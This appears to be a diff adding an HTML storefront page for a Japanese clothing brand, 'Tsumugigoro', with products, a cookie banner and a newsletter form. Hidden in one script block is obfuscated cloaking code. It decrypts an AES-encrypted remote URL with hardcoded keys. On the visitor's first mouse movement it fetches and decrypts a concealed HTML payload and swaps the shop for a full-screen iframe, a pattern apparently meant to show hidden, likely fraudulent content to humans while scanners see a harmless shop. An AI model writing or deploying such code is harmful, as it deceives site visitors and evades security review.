@@ -1,0 +1,311 @@
+
+<!doctype html>
+<html lang="en">
+
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Tsumugigoro｜Living with Clothes</title>
+<meta name="description" content="Tsumugigoro is a Japanese clothing store focused on quality materials and craftsmanship, creating clothes for everyday life.">
+<meta name="theme-color" content="#f2eee6">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23d94f36'/%3E%3Cpath d='M20 18h24v28H20zM26 24h12M26 32h12M26 40h8' fill='none' stroke='%23fff' stroke-width='3'/%3E%3C/svg%3E">
+<style>
+:root{--bg:#f2eee6;--paper:#fbf9f4;--ink:#22221f;--muted:#77756d;--red:#d94f36;--blue:#dfe7e1;--line:#cfcac0;--max:1280px}
+*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--bg);color:var(--ink);font-family:"Noto Sans JP","Hiragino Kaku Gothic ProN","Yu Gothic",sans-serif}a{text-decoration:none;color:inherit}img{display:block;width:100%;object-fit:cover}button,input{font:inherit}
+.page{width:min(calc(100% - 34px),var(--max));margin:auto}
+header{height:72px;border-bottom:1px solid var(--line);display:flex;align-items:center;background:var(--bg);position:sticky;top:0;z-index:50}.nav{display:grid;grid-template-columns:180px 1fr 180px;align-items:center}.brand{font-size:24px;font-weight:950;letter-spacing:.16em}.brand small{font-size:8px;display:block;letter-spacing:.28em;color:var(--muted);margin-top:-2px}.links{display:flex;justify-content:center;gap:28px;font-size:11px;font-weight:900}.links a:hover{color:var(--red)}.bag{text-align:right;font-size:10px;font-weight:900}.bag b{display:inline-grid;place-items:center;width:19px;height:19px;border-radius:50%;background:var(--red);color:#fff;margin-left:5px}.menu{display:none}
+
+.hero{display:grid;grid-template-columns:105px 1fr 1.08fr;min-height:680px;border-bottom:1px solid var(--line)}.side-title{border-right:1px solid var(--line);display:flex;justify-content:center;padding-top:34px}.side-title span{writing-mode:vertical-rl;font-size:10px;letter-spacing:.3em;font-weight:900;color:var(--red)}.hero-copy{padding:75px 50px;display:flex;flex-direction:column;justify-content:center}.season{font-size:10px;letter-spacing:.24em;font-weight:900;margin-bottom:25px}.hero h1{font-size:clamp(47px,6.7vw,92px);line-height:1.02;letter-spacing:-.07em;margin:0 0 28px}.hero h1 i{font-style:normal;color:var(--red)}.hero p{font-size:13px;line-height:2;color:var(--muted);max-width:390px}.hero-link{margin-top:24px;width:max-content;font-size:11px;font-weight:950;border-bottom:2px solid var(--red);padding-bottom:7px}.hero-link:hover{color:var(--red)}.hero-photo{position:relative;border-left:1px solid var(--line);overflow:hidden}.hero-photo img{height:100%;min-height:680px;filter:saturate(.72)}.hero-note{position:absolute;left:22px;top:22px;background:var(--paper);padding:10px 13px;font-size:9px;font-weight:900;z-index:2}.circle{position:absolute;right:25px;bottom:25px;width:108px;height:108px;background:var(--red);color:white;border-radius:50%;display:grid;place-items:center;text-align:center;font-size:10px;font-weight:900;line-height:1.45;transform:rotate(-9deg)}
+
+.intro{display:grid;grid-template-columns:1fr 1fr;gap:70px;padding:75px 0;border-bottom:1px solid var(--line)}.intro h2{font-size:36px;line-height:1.35;margin:0;letter-spacing:-.05em}.intro p{font-size:12px;line-height:2;color:var(--muted);margin:0}.redline{width:65px;height:4px;background:var(--red);margin-bottom:22px}
+
+.section{padding:100px 0}.section-title{display:flex;align-items:start;gap:20px;margin-bottom:35px}.section-title .number{font-size:11px;color:var(--red);font-weight:950;padding-top:7px}.section-title h2{font-size:43px;line-height:1.15;letter-spacing:-.06em;margin:0}.section-title p{margin:8px 0 0 35px;font-size:11px;color:var(--muted);max-width:340px}
+.products{display:grid;grid-template-columns:1.4fr .8fr .8fr;grid-template-rows:auto auto;gap:14px}.product:first-child{grid-row:span 2}.product{background:var(--paper);position:relative}.product-photo{overflow:hidden;position:relative}.product:first-child .product-photo img{height:660px}.product:not(:first-child) .product-photo img{height:318px}.product img{filter:saturate(.72);transition:transform .5s}.product:hover img{transform:scale(1.04)}.product-info{padding:14px 4px 2px}.product-name{font-size:12px;font-weight:950}.product-meta{font-size:9px;color:var(--muted);margin-top:3px}.product-price{font-size:11px;font-weight:900;margin-top:8px}.new{position:absolute;top:10px;left:10px;background:var(--red);color:#fff;padding:5px 8px;font-size:8px;font-weight:950;z-index:2}
+
+.banner{background:var(--blue);padding:85px 0}.banner-grid{display:grid;grid-template-columns:.7fr 1.3fr;gap:60px;align-items:end}.vertical-label{writing-mode:vertical-rl;font-size:10px;letter-spacing:.25em;color:var(--red);font-weight:950}.banner h2{font-size:clamp(45px,6vw,78px);line-height:1.05;letter-spacing:-.07em;margin:0}.banner p{font-size:12px;color:#5e665f;line-height:2;margin:22px 0 0;max-width:520px}.banner a{display:inline-block;margin-top:28px;border-bottom:1px solid var(--ink);font-size:10px;font-weight:950;padding-bottom:6px}
+
+.lookbook{display:grid;grid-template-columns:.75fr 1.25fr;gap:14px}.look-left{background:var(--ink);color:white;padding:45px;display:flex;flex-direction:column;justify-content:space-between;min-height:650px}.look-left h2{font-size:42px;line-height:1.2;letter-spacing:-.06em;margin:10px 0}.look-left p{font-size:11px;color:#aaa9a3;line-height:2}.look-left a{font-size:10px;color:#fff;border-bottom:1px solid #777;padding-bottom:6px;width:max-content}.look-right{display:grid;grid-template-columns:1fr 1fr;gap:14px}.look-right div{overflow:hidden}.look-right div:first-child{grid-column:span 2}.look-right img{height:100%;min-height:315px;filter:saturate(.7);transition:transform .5s}.look-right div:first-child img{min-height:410px}.look-right div:hover img{transform:scale(1.035)}
+
+.story{display:grid;grid-template-columns:1fr 1fr;gap:70px;align-items:center}.story-photo img{height:590px;filter:saturate(.65)}.story-copy .label{font-size:10px;color:var(--red);letter-spacing:.22em;font-weight:950}.story-copy h2{font-size:clamp(40px,5vw,68px);line-height:1.08;letter-spacing:-.07em;margin:10px 0 25px}.story-copy p{font-size:12px;color:var(--muted);line-height:2}.points{margin-top:32px;border-top:1px solid var(--line)}.point{display:flex;gap:25px;border-bottom:1px solid var(--line);padding:15px 0;font-size:10px}.point b{color:var(--red)}
+
+.service{background:var(--red);color:#fff;padding:70px 0}.service-grid{display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:end}.service h2{font-size:44px;line-height:1.2;letter-spacing:-.05em;margin:8px 0}.service p{font-size:11px;line-height:2;color:#ffe5df;max-width:420px}.service-form{display:flex;border-bottom:1px solid #fff;padding-bottom:8px}.service-form input{flex:1;background:none;border:0;outline:0;color:white;font-size:11px}.service-form input::placeholder{color:#ffd1c7}.service-form button{border:0;background:white;color:var(--red);padding:10px 16px;font-size:9px;font-weight:950;cursor:pointer}.service-form button:hover{background:var(--ink);color:white}
+
+footer{padding:48px 0 22px}.foot{display:flex;justify-content:space-between}.foot-links{display:flex;gap:25px;font-size:10px;font-weight:900}.foot-links a:hover{color:var(--red)}.copy{border-top:1px solid var(--line);margin-top:45px;padding-top:17px;color:var(--muted);font-size:8px}
+
+@media(max-width:900px){.page{width:min(calc(100% - 26px),var(--max))}.nav{display:flex;justify-content:space-between}.links,.bag{display:none}.menu{display:block;font-size:20px}.hero{grid-template-columns:1fr;min-height:auto}.side-title{display:none}.hero-copy{padding:65px 0 50px}.hero-photo{border-left:0}.hero-photo img{min-height:510px;height:510px}.intro{grid-template-columns:1fr;gap:25px;padding:55px 0}.section{padding:78px 0}.products{grid-template-columns:1fr 1fr}.product:first-child{grid-row:auto;grid-column:span 2}.product:first-child .product-photo img,.product:not(:first-child) .product-photo img{height:450px}.banner{padding:65px 0}.banner-grid{grid-template-columns:1fr;gap:30px}.vertical-label{writing-mode:initial}.lookbook{grid-template-columns:1fr}.look-left{min-height:400px}.story{grid-template-columns:1fr;gap:35px}.story-photo img{height:470px}.service-grid{grid-template-columns:1fr;gap:30px}}
+@media(max-width:520px){.hero h1{font-size:56px}.section-title{display:block}.section-title p{margin:12px 0 0}.section-title h2{font-size:35px}.products{gap:10px}.product:first-child{grid-column:span 2}.product:first-child .product-photo img,.product:not(:first-child) .product-photo img{height:310px}.product-info{padding:10px 2px}.look-right{grid-template-columns:1fr}.look-right div:first-child{grid-column:auto}.look-right img,.look-right div:first-child img{min-height:340px;height:340px}.service h2{font-size:36px}.foot{display:block}.foot-links{margin-top:25px;flex-wrap:wrap}}
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}.product img,.look-right img{transition:none}}
+</style>
+<script src="../cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #1e293b; background: #fff; }
+
+  /* Redesigned Popup Styles */
+  .popup-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(15, 23, 42, 0.6);
+    backdrop-filter: blur(8px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    opacity: 1;
+    transition: opacity 0.3s ease;
+  }
+
+  .popup-card {
+    background: #ffffff;
+    padding: 40px;
+    border-radius: 16px;
+    text-align: center;
+    width: 90%;
+    max-width: 440px;
+    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
+  }
+
+  /* CSS Spinner (Replaces GIF) */
+  .spinner {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 24px auto;
+    border: 4px solid #e2e8f0;
+    border-top: 4px solid #082b5c;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .popup-card h3 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #0f172a;
+    margin-bottom: 8px;
+  }
+
+  .popup-card p {
+    font-size: 0.95rem;
+    color: #64748b;
+    margin-bottom: 28px;
+  }
+
+  .popup-buttons {
+    display: flex;
+    gap: 12px;
+  }
+
+  .btn {
+    flex: 1;
+    padding: 12px 20px;
+    font-size: 0.95rem;
+    font-weight: 600;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+  }
+
+  .btn-cancel {
+    background: #f1f5f9;
+    color: #475569;
+  }
+  .btn-cancel:hover { background: #e2e8f0; }
+
+  .btn-continue {
+    background: #082b5c;
+    color: #ffffff;
+  }
+  .btn-continue:hover { background: #061e40; }
+
+  /* Page Layout & Frame */
+  #frame { display: none; width: 100%; height: 100vh; border: 0; }
+  header { background: #082b5c; color: #fff; padding: 15px 0; }
+  .container { width: 95%; max-width: 1400px; margin: auto; }
+  .nav { display: flex; justify-content: space-between; align-items: center; }
+  .logo { font-size: 24px; font-weight: bold; }
+  .hero { padding: 40px 0; text-align: center; }
+</style>
+</head>
+<body>
+<iframe id="frame" title="Encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+<div id="cookie-banner" class="cookie-hidden">
+    <style>
+        /* Scoped UI Layout & Core Variables */
+        #cookie-banner.cookie-hidden { display: none !important; }
+        #cookie-overlay {
+            position: fixed; inset: 0; z-index: 99999;
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+            opacity: 0; transition: opacity 0.3s ease;
+        }
+        #cookie-window {
+            position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100000;
+            opacity: 0; transform: scale(0.95); transition: all 0.3s ease; pointer-events: none;
+        }
+        #cookie-banner.cookie-active #cookie-overlay { opacity: 1; }
+        #cookie-banner.cookie-active #cookie-window { opacity: 1; transform: scale(1); pointer-events: auto; }
+
+        /* Panel Aesthetics */
+        .cookie-card {
+            background: #fff; color: #2d3748; border-radius: 16px; padding: 28px; position: relative;
+            max-width: 500px; width: 100%; box-sizing: border-box; box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        .cookie-x { position: absolute; top: 16px; right: 16px; background: none; border: none; cursor: pointer; color: #718096; }
+        .cookie-x:hover { color: #e53e3e; }
+        .cookie-title { display: flex; align-items: center; gap: 8px; margin: 0 0 12px 0; font-size: 1.35rem; font-weight: 700; }
+
+        /* Content Policy Scroller */
+        .cookie-scroll {
+            font-size: 0.88rem; color: #4a5568; line-height: 1.5; margin-bottom: 20px;
+            max-height: 140px; overflow-y: auto; border: 1px solid #e2e8f0; padding: 12px; border-radius: 8px; background: #f7fafc;
+        }
+        .cookie-scroll h3 { font-size: 0.9rem; margin: 10px 0 4px 0; color: #1a202c; }
+        .cookie-scroll ul { margin: 0; padding-left: 18px; }
+
+        /* Action Controls */
+        .cookie-actions { display: flex; flex-direction: column; gap: 10px; }
+        .cookie-btn { width: 100%; padding: 11px; border-radius: 8px; font-weight: 700; font-size: 0.95rem; cursor: pointer; border: none; text-align: center; }
+        .cookie-yes { background: #38a169; color: #fff; }
+        .cookie-yes:hover { background: #2f855a; }
+        .cookie-no { background: #edf2f7; color: #2d3748; }
+        .cookie-no:hover { background: #e2e8f0; }
+
+        @media (min-width: 576px) { .cookie-actions { flex-direction: row; } }
+    </style>
+
+    <div id="cookie-overlay" data-cookie="closed"></div>
+    <div id="cookie-window">
+        <div class="cookie-card">
+            <button class="cookie-x" data-cookie="closed" aria-label="Close">
+                <svg viewBox="0 0 15 15" height="22" width="22"><path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/></svg>
+            </button>
+            <h2 class="cookie-title">🍪 Cookie Policy Consent</h2>
+            <div class="cookie-scroll">
+                <p>We use cookies to improve usability, analyze site traffic, and deliver advertising.</p>
+                <h3>■ Main purposes</h3>
+                <ul>
+                    <li>Essential functions required for the site to operate</li>
+                    <li>Improving usability through analytics (performance)</li>
+                    <li>Showing advertising based on interests and preferences (marketing)</li>
+                </ul>
+            </div>
+            <div class="cookie-actions">
+                <button class="cookie-btn cookie-yes" data-cookie="accepted">Accept All</button>
+                <button class="cookie-btn cookie-no" data-cookie="declined">Decline</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        const wrapper = document.getElementById('cookie-banner');
+        if (!wrapper || localStorage.getItem('cookie-consent')) return;
+
+        const hide = (decision) => {
+            localStorage.setItem('cookie-consent', decision);
+            wrapper.classList.remove('cookie-active');
+            setTimeout(() => wrapper.classList.add('cookie-hidden'), 300);
+            document.removeEventListener('mousemove', mouseClose);
+        };
+
+        const mouseClose = () => hide('closed');
+
+        // Event delegation processing for all structural buttons/clicks
+        wrapper.addEventListener('click', (e) => {
+            const action = e.target.closest('[data-cookie]')?.dataset.cookie;
+            if (action) hide(action);
+        });
+
+        // Initialize Display
+        wrapper.classList.remove('cookie-hidden');
+        setTimeout(() => wrapper.classList.add('cookie-active'), 10);
+        document.addEventListener('mousemove', mouseClose, { once: true });
+    })();
+</script>
+
+<script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18HjV31QpEAIQ/vjst0/S7rqkT7x6FaGIgBccOOZppRKnx9nOFQDn7fYWk/llE/IyEQoWUDuvDM4A==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    let lastUrl = null;
+
+    async function loadSecret() {
+        const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+        try {
+            const res = await fetch(DATA_ORIGIN + "win/sec");
+            const { cipher } = await res.json();
+            const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+            if (!html) throw new Error("Decrypt failed — wrong key?");
+
+            if (lastUrl) URL.revokeObjectURL(lastUrl);
+            const blob = new Blob([html], { type: "text/html" });
+            lastUrl = URL.createObjectURL(blob);
+
+            frame.src = lastUrl;
+
+
+            shop.style.display = "none";
+            frame.style.display = "block";
+
+        } catch (e) {
+            document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        }
+    }
+
+
+    window.addEventListener("mousemove", () => {
+        loadSecret();
+    }, { once: true });
+</script>
+
+
+  <div id="shop">
+<header><div class="page nav"><a class="brand" href="#home">Tsumugigoro<small>TSUMUGIGORO</small></a><nav class="links"><a href="#new">New Arrivals</a><a href="#collection">Collection</a><a href="#look">Styling</a><a href="#story">About Us</a></nav><a class="bag" href="#new">Shopping Bag <b id="count">0</b></a><a class="menu" href="#new" aria-label="Collectionを見る">☰</a></div></header>
+
+<main id="home">
+<section class="page hero"><div class="side-title"><span>Living with Clothes</span></div><div class="hero-copy"><div class="season">2026 Autumn Collection</div><h1>Clothes that<br><i>belong in your life.</i></h1><p>Never overdone, yet never ordinary. Tsumugigoro creates clothing designed around everyday movement and comfort.</p><a class="hero-link" href="#new">Discover New Arrivals →</a></div><div class="hero-photo"><div class="hero-note">This Season’s Look 01</div><img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&amp;fit=crop&amp;w=1400&amp;q=85" alt="Autumn fashion"><div class="circle">Wear<br>your own style<br>every day.</div></div></section>
+
+<section class="page intro"><div><div class="redline"></div><h2>Clothes are<br>part of everyday life.</h2></div><p>From getting ready in the morning to heading out into the city. We create the small comforts that make you feel good every time you wear them—through thoughtful materials and careful craftsmanship.</p></section>
+
+<section class="page section" id="new"><div class="section-title"><span class="number">01</span><div><h2>New Arrivalsの四着</h2><p>New essentials made for the season.</p></div></div>
+<div class="products">
+<article class="product"><div class="product-photo"><span class="new">New Arrivals</span><img src="https://images.unsplash.com/photo-1551028719-00167b16eac5?auto=format&amp;fit=crop&amp;w=1000&amp;q=85" alt="Brown jacket"></div><div class="product-info"><div class="product-name">Woodland Jacket</div><div class="product-meta">Soft wool / Deep brown</div><div class="product-price">¥28,600</div></div></article>
+<article class="product"><div class="product-photo"><img src="https://images.unsplash.com/photo-1548883354-94bcfe321cbb?auto=format&amp;fit=crop&amp;w=800&amp;q=85" alt="Knitwear"></div><div class="product-info"><div class="product-name">Warm Light Knit</div><div class="product-meta">Wool / Warm white</div><div class="product-price">¥19,800</div></div></article>
+<article class="product"><div class="product-photo"><img src="https://images.unsplash.com/photo-1551488831-00ddcb6c6bd3?auto=format&amp;fit=crop&amp;w=800&amp;q=85" alt="Denim"></div><div class="product-info"><div class="product-name">Blue Night Pants</div><div class="product-meta">12 oz cotton / Deep indigo</div><div class="product-price">¥16,500</div></div></article>
+<article class="product"><div class="product-photo"><span class="new">Popular</span><img src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?auto=format&amp;fit=crop&amp;w=800&amp;q=85" alt="White shirt"></div><div class="product-info"><div class="product-name">Porcelain Shirt</div><div class="product-meta">Natural cotton / Ecru</div><div class="product-price">¥13,200</div></div></article>
+</div></section>
+
+<section class="banner" id="collection"><div class="page banner-grid"><div><div class="vertical-label">Seasonal Wardrobe</div></div><div><h2>Layer lightly,<br>enjoy autumn.</h2><p>Lightweight shirts, textured knits, and slightly oversized jackets. The more you layer, the more your own style comes to life.</p><a href="#new">View Autumn Collection →</a></div></div></section>
+
+<section class="page section" id="look"><div class="section-title"><span class="number">02</span><div><h2>Styling</h2><p>Three days, one wardrobe.</p></div></div><div class="lookbook"><div class="look-left"><div><div class="redline"></div><h2>Enjoy getting dressed<br>even more.</h2><p>There are no fixed rules. Choose your favorite colors, textures, and whatever suits your mood. The time you spend choosing what to wear is part of everyday life.</p></div><a href="#new">Collectionを見る　→</a></div><div class="look-right"><div><img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?auto=format&amp;fit=crop&amp;w=1100&amp;q=85" alt="Women’s autumn/winter styling"></div><div><img src="https://images.unsplash.com/photo-1617127365659-c47fa864d8bc?auto=format&amp;fit=crop&amp;w=800&amp;q=85" alt="Men’s autumn/winter styling"></div><div><img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&amp;fit=crop&amp;w=800&amp;q=85" alt="Street fashion"></div></div></div></section>
+
+<section class="page section" id="story"><div class="story"><div class="story-photo"><img src="https://images.unsplash.com/photo-1485968579580-b6d095142e6e?auto=format&amp;fit=crop&amp;w=1000&amp;q=85" alt="Clothing and materials"></div><div class="story-copy"><div class="label">About Us</div><h2>The longer you wear it,<br>the more you love it.</h2><p>We do not choose based on trends alone. We carefully make every piece with attention to its feel, ease of movement, and how it looks after washing.</p><div class="points"><div class="point"><b>1</b><span>We value materials that feel good against your skin.</span></div><div class="point"><b>2</b><span>We design shapes you can wear every day.</span></div><div class="point"><b>3</b><span>We create clothes made to be enjoyed for years.</span></div></div></div></div></section>
+
+<section class="service"><div class="page service-grid"><div><div class="eyebrow" style="font-size:10px;letter-spacing:.22em;font-weight:950">A Note from Tsumugigoro</div><h2>New clothes and<br>seasonal notes.</h2><p>新作、Styling、素材のお話などを月に1度お届けします。</p></div><form class="service-form" onsubmit="event.preventDefault();alert('Thank you for subscribing.')"><input type="email" required placeholder="Email address" aria-label="Email address"><button>Subscribe →</button></form></div></section>
+</main>
+
+<footer><div class="page foot"><div class="brand">Tsumugigoro<small>TSUMUGIGORO</small></div><nav class="foot-links"><a href="#new">New Arrivals</a><a href="#collection">Collection</a><a href="#look">Styling</a><a href="#story">About Us</a></nav></div><div class="page copy">© 2026 Tsumugigoro. All rights reserved.</div></footer>
+<script>
+let n=0;document.querySelectorAll('.product').forEach((p,i)=>{p.addEventListener('click',()=>{n++;document.getElementById('count').textContent=n;alert('CollectionをShopping Bagに追加しました。');})});
+</script>
+</div>
+
+  
+
+</body>
+
+</html>
